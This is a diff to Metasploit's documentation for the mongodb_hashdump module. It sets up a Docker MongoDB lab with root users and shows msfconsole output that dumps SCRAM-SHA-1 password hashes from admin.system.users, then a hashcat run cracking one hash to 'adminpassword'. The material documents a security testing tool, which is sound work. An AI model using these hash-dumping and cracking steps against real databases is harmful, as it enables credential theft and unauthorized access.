@@ -15,10 +15,16 @@ Successfully tested against MongoDB 3.6 with and without authentication
 Write this file to `init-mongo.js`
 
 ```
-// Switch to 'intranet' database
-db = db.getSiblingDB('intranet');
+// Privileged user for hashdump testing (users are stored in admin on 3.0+)
+db = db.getSiblingDB('admin');
+db.createUser({
+  user: "rootuser",
+  pwd: "rootpass",
+  roles: [ { role: "root", db: "admin" } ]
+});
 
-// Create a non-root read/write user for testing
+// Create a non-root read/write user for testing, plus sample data, in intranet
+db = db.getSiblingDB('intranet');
 db.createUser({
   user: "testuser",
   pwd: "testpass",
@@ -51,6 +57,8 @@ services:
       - "27017:27017"
     environment:
       MONGO_INITDB_DATABASE: intranet
+      MONGO_INITDB_ROOT_USERNAME: admin
+      MONGO_INITDB_ROOT_PASSWORD: adminpassword
     volumes:
       - mongo_data:/data/db
       - ./init-mongo.js:/docker-entrypoint-initdb.d/init-mongo.js:ro
@@ -61,7 +69,7 @@ volumes:
 
 ## Verification Steps
 
-1. Install the application
+1. Install the application (`docker compose down -v && docker compose up -d`)
 1. Start msfconsole
 1. Do: `use auxiliary/scanner/mongodb/mongodb_hashdump`
 1. Optionally Do: `set username <username>`
@@ -104,20 +112,29 @@ Password for authentication if required. Defaults to ``.
 msf > use auxiliary/scanner/mongodb/mongodb_hashdump 
 msf auxiliary(scanner/mongodb/mongodb_hashdump) > set rhosts 127.0.0.1
 rhosts => 127.0.0.1
-msf auxiliary(scanner/mongodb/mongodb_hashdump) > exploit
-[*] 127.0.0.1:27017 - Connecting to 127.0.0.1...
-[+] 127.0.0.1:27017 - No authentication required
-[*] 127.0.0.1:27017 - Dumping MongoDB system users from admin.system.users...
-[+] 127.0.0.1:27017 - 
+msf auxiliary(scanner/mongodb/mongodb_hashdump) > set username admin
+username => admin
+msf auxiliary(scanner/mongodb/mongodb_hashdump) > set username rootuser
+username => rootuser
+msf auxiliary(scanner/mongodb/mongodb_hashdump) > set password rootpass
+password => rootpass
+msf auxiliary(scanner/mongodb/mongodb_hashdump) > run
+[*] 127.0.0.1:27017       - Connecting to 127.0.0.1...
+[*] 127.0.0.1:27017       - Authentication required, attempting login as 'rootuser'...
+[+] 127.0.0.1:27017       - SUCCESSFUL LOGIN 'rootuser' : 'rootpass' (SCRAM-SHA-1)
+[+] 127.0.0.1:27017       - Successfully authenticated
+[*] 127.0.0.1:27017       - Dumping MongoDB system users from admin.system.users...
+[+] 127.0.0.1:27017       - 
 MongoDB System Hashes
 =====================
 
 Type              Username  Hash
 ----              --------  ----
-db (SCRAM-SHA-1)  admin     $mongodb-scram$*0*YWRtaW4=*10000*1kvLnsfbYpJe0HcO/W7MLw==*NyPJ9yTYQcSRYcyC+8rCqvu9c4g=
+db (SCRAM-SHA-1)  admin     $mongodb-scram$*0*YWRtaW4=*10000*xCc57N/8IgpWEHPODdHsAQ==*+bxIK/YAwBSxMLnRpPf4AmbSBvQ=
+db (SCRAM-SHA-1)  rootuser  $mongodb-scram$*0*cm9vdHVzZXI=*10000*VfQAlXrH/YonbvSB+2fRQQ==*8KXH4TJMtnB93DdA17bHqnfJ89I=
+db (SCRAM-SHA-1)  testuser  $mongodb-scram$*0*dGVzdHVzZXI=*10000*rIQ3DXQKAav/vJ2/pjfRQA==*aXtJ8Hri4pewkuIucDZhv3aYexM=
 
-[*] 127.0.0.1:27017 - Scanned 1 of 1 hosts (100% complete)
-[*] Auxiliary module execution completed
+[*] 127.0.0.1:27017       - Scanned 1 of 1 hosts (100% complete)
 ```
 
 #### Cracking
@@ -134,7 +151,7 @@ OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM
 
 Approaching final keyspace - workload adjusted.           
 
-$mongodb-scram$*0*YWRtaW4=*10000*1kvLnsfbYpJe0HcO/W7MLw==*NyPJ9yTYQcSRYcyC+8rCqvu9c4g=:adminpassword
+$mongodb-scram$*0*YWRtaW4=*10000*xCc57N/8IgpWEHPODdHsAQ==*+bxIK/YAwBSxMLnRpPf4AmbSBvQ=:adminpassword
                                                           
 Session..........: hashcat
 Status...........: Cracked
